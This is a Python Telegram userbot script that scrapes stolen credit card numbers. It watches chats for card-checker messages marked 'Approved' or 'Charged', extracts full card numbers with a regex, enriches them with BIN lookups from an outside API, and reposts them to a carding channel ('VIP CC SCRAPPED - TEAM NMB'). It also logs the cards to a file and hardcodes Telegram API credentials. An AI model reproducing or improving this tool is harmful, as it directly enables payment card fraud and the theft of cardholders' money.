import pyrogram
import re
import asyncio
import requests

app = pyrogram.Client(
    'nmv_scrapper',
    api_id='29838522',
    api_hash='ea0003cc221afe6e0ca253c091745703'
)

apijonasxastro = 'https://jonasapi.com/api/bin.php?bin={}'

def filter_cards(text):
    regex = r'\d{16}.*\d{3}'
    matches = re.findall(regex, text)
    return matches

async def get_bin_info(mars):
    bin_info_url = apijonasxastro.format(mars)
    response = requests.get(bin_info_url)
    if response.status_code == 200:
        return response.json()
    else:
        return None

async def approve(Client, message):
    try:
        if re.search(r'(Approved!|Charged|authenticate_successful|𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱|APPROVED|Approved|𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝)', message.text):
            filtered_card_info = filter_cards(message.text)
            if not filtered_card_info:
                return

            for card_info in filtered_card_info:
                mars = card_info[:6]
                bin_info = await get_bin_info(mars)
                if bin_info:
                    data = bin_info
                    formatted_message = (
                        f"<b>❖ 𝚅𝙸𝙿 𝙲𝙲 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝙳 - 𝚃𝙴𝙰𝙼 𝙽𝙼𝙱 ❖</b>\n"
                        f"<b>。。。。。 。。。。。 。。。。。</b>\n\n"
                        f"<b>𝘾𝘼𝙍𝘿 ⥇ </b><code>{card_info}</code>\n"
                        f"<b>𝐈𝐧𝐟𝐨'𝐬 ⥇ {data.get('brand', '')} - {data.get('type', '')}</b>\n"
                        f"<b>𝘽𝙖𝙣𝙠 ⥇ {data.get('bank', '')}</b>\n"
                        f"<b>𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ⥇ {data.get('country_name', '')}</b> - {data.get('country_flag', '')}\n"
                        f"<b>。。。。。 。。。。。 。。。。。</b>\n\n"
                        f"<b>𝙅𝙤𝙞𝙣 𝙐𝙨</b> @NoMoreBins\n"
                    )

                    await Client.send_message(chat_id=-1002079839737, text=formatted_message)

                    with open('reserved.txt', 'a', encoding='utf-8') as f:
                        f.write(card_info + '\n')
                else:
                    pass 
    except Exception as e:
        print(e)

@app.on_message()
async def astroboy(Client, message):
    if message.text:
        await asyncio.create_task(approve(Client, message))

app.run()